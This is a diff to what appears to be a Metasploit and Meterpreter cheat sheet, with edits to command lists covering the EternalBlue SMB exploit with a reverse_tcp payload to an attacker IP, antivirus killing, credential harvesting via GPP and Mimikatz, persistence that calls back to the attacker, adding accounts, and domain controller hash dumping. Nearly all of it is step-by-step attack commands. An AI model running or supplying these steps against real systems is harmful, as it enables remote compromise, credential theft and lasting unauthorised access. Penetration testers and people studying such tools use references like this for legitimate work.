@@ -63,18 +63,25 @@ use <auxiliary, encoder, exploit, nop, payload, post>
 
 search eternalblue
 use exploit/windows/smb/ms17_010_eternalblue      Set the exploit module
+use <#>                                           Or set the exploit module using the search result number
+
 show info                                         Show basic info on the exploit
-show targets                                      Show OSs that can be targeted with this exploit
 set rhost <target IP>                             Set the target IP
+
 show payloads                                     Show payloads that work with this exploit
 set payload windows/x64/meterpreter/reverse_tcp   Set the payload module
+set payload <#>                                   Or set the payload module using the search result number
+
 show options                                      Show remaining options for the payload
 set lhost <attacker IP>                           Set to the attacker's IP
 set lport <attacker port>                         Set to the attacker's listening port to 443
+
 show targets                                      Show target options
 show advanced                                     Show advanced options
 show evasion                                      Show evasion options
 exploit                                           Run the exploit
+
+This particular exploit will drop you into a meterpreter session running at NT AUTHORITY\SYSTEM.
 ------------------------------------------------------------------------------------------------------
 
 # Generate payloads
@@ -150,7 +157,7 @@ webcam_snap                                       Takes a picture from the web c
 sysinfo                                           Gets information about the remote system, such as OS
 getuid                                            Get the user that the server is running as
 ps                                                Search for a process running as NT AUTHORITY\SYSTEM (or root on *nix)
-migrate <PID>                                     Migrate to a process running as NT AUTHORITY\SYSTEM (or root on *nix)
+migrate <PID>                                     Migrate to that process using its PID
 ------------------------------------------------------------------------------------------------------
 
 # Privilege escalation - Windows
@@ -197,30 +204,26 @@ use exploit/windows/local/                        There are currently 77 options
 
 # Windows enumeration
 
-use post/windows/gather/enum_domain               Identifies the primary domain via the registry
-use post/windows/gather/enum_domains              Enumerates the domains a host can see and the domain controllers for that domain
-use post/windows/gather/enum_logged_on_users      Enumerate current and recently logged on Windows users
-use post/windows/gather/enum_shares               Enumerate configured and recently used file shares
+run post/windows/gather/enum_domain               Identifies the primary domain via the registry
+run post/windows/gather/enum_domains              Enumerates the domains a host can see and the domain controllers for that domain
+run post/windows/gather/enum_logged_on_users      Enumerate current and recently logged on Windows users
+run post/windows/gather/enum_shares               Enumerate configured and recently used file shares
 
 run killav
 run getcountermeasure
 run winenum
 ------------------------------------------------------------------------------------------------------
 
-# Dump hashes and creds
+# Dump creds
 
-ps                                                Show running processes
-migrate <PID>                                     Migrate to a process running as NT AUTHORITY\SYSTEM
-hashdump                                          Dump password hashes
-
-use post/windows/gather/credentials/credential_collector     Harvests credentials found on the host
-use post/windows/gather/credentials/gpp
+run post/windows/gather/credentials/gpp
 ------------------------------------------------------------------------------------------------------
 
 # Mimikatz
 
 load kiwi                                         Load Mimikatz
 creds_all                                         Retrieve all credentials
+
 creds_kerberos                                    Retrieve Kerberos creds
 creds_livessp                                     Retrieve LiveSSP creds
 creds_msv                                         Retrieve LM/NTLM creds (hashes)
@@ -258,8 +261,8 @@ getuid
 
 Option 1
 run persistence -h
-run persistence <starts at computer startup> <tries to connect every 30s> <port 443> <attacker IP>
-run persistence -X -i 30 -p 443 -r <target IP>
+run persistence <starts at computer startup> <tries to connect every 30s> <attacker port> <attacker IP>
+run persistence -X -i 30 -p 443 -r <attacker IP>
 Notice that it shows where the file is stored on the Windows machine.
 It also gives you the location of the Meterpreter resource file you can run to remove persistence.
 
@@ -269,7 +272,7 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <attacker IP>
 set LPORT 443
 set ExitOnSession false
-set AutoRunScript persistence -X -i 30 -p 443 -r <target IP>
+set AutoRunScript persistence -X -i 30 -p 443 -r <attacker IP>
 exploit -j -z
 
 Option 2 - Add a user
@@ -355,17 +358,17 @@ run
 
 # Post exploitation - domain controller (DC)
 
-use post/windows/gather/credentials/domain_hashdump       Attempts to copy the NTDS.dit database and parse
-                                                          out all of the User Accounts. It saves all of the
-                                                          captured password hashes, including historical ones
-use post/windows/gather/enum_ad_computers         Windows Gather Active Directory Computers
-use post/windows/gather/enum_ad_groups            Windows Gather Active Directory Groups
-use post/windows/gather/enum_ad_managedby_groups  Windows Gather Active Directory Managed Groups
-use post/windows/gather/enum_ad_service_principal_names   Windows Gather Active Directory Service Principal Names
-use post/windows/gather/enum_ad_to_wordlist       Windows Active Directory Wordlist Builder
-use post/windows/gather/enum_ad_user_comments     Windows Gather Active Directory User Comments
-use post/windows/gather/enum_ad_users             Windows Gather Active Directory Users
-use post/windows/gather/enum_domain_users         Windows Gather Enumerate Active Domain Users
+run post/windows/gather/credentials/domain_hashdump       Attempts to copy the NTDS.dit database and parse
+                                                             out all of the User Accounts. It saves all of the
+                                                             captured password hashes, including historical ones
+run post/windows/gather/enum_ad_computers         Windows Gather Active Directory Computers
+run post/windows/gather/enum_ad_groups            Windows Gather Active Directory Groups
+run post/windows/gather/enum_ad_managedby_groups  Windows Gather Active Directory Managed Groups
+run post/windows/gather/enum_ad_service_principal_names   Windows Gather Active Directory Service Principal Names
+run post/windows/gather/enum_ad_to_wordlist       Windows Active Directory Wordlist Builder
+run post/windows/gather/enum_ad_user_comments     Windows Gather Active Directory User Comments
+run post/windows/gather/enum_ad_users             Windows Gather Active Directory Users
+run post/windows/gather/enum_domain_users         Windows Gather Enumerate Active Domain Users
 
 - Add any user in Active Directory
 use windows/manage/add_user_domain
